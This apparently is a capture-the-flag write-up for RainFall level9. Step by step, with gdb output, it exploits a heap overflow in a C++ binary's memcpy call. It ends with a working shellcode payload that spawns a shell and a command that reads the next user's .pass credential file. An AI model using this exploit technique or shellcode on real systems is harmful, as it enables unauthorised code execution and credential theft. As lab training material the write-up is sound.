The `main` function takes one parameter and there is a call to `memcpy` inside `setAnnotation`. The program will copy the values we give as parameter to a memory block without any check.

```
Starting program: /home/user/level9/level9 $(python -c "print 'A' * 200")

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x41414141	1094795585
ecx            0x41414141	1094795585
```

The instruction where the Segmentation fault happens is +142, when it wants to access `eax` to store it in `edx` which is then called.

```
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
=> 0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
```

We need to find the buffer's size, in gdb :

```
Starting program: /home/user/level9/level9 $(python -c 'print "QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNNMMMMMQQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNNMMMMM"')

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x45455757	1162172247
ecx            0x8	8
...
```

The offset is at `108`.
Our goal is to modify the call to `edx` to open a shell. We have hands on the `eax` value that will be copied into `edx`.
We have to find the address where the shellcode will start, write the shellcode, add a padding to complete the buffer and add the address of the beguining of our string. The shell code that would be executed as the next instruction.

```
Breakpoint 1, 0x08048510 in memcpy@plt ()
(gdb) i r
...
edx            0x804a00c	134520844
...
Breakpoint 2, 0x0804867c in main ()
(gdb) i r
eax            0x804a00c	134520844
ecx            0x8	8
edx            0x804a0d8	134521048
ebx            0x804a078	134520952
esp            0xbffff540	0xbffff540
ebp            0xbffff568	0xbffff568
esi            0x0	0
edi            0x0	0
eip            0x804867c	0x804867c <main+136>
...
```

Our instruction will start at `0x804a00c` and our [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.php) (28 bytes) will beguin at the address `0x804a00c + 4 bytes`.

```
>>> int('0x804a00c', 16) + 4
134520848
>>> hex(134520848)
'0x804a010'
```

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" + "\xe3\x89\xc1\x89\xc2\xb0\x0b" + "\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
```



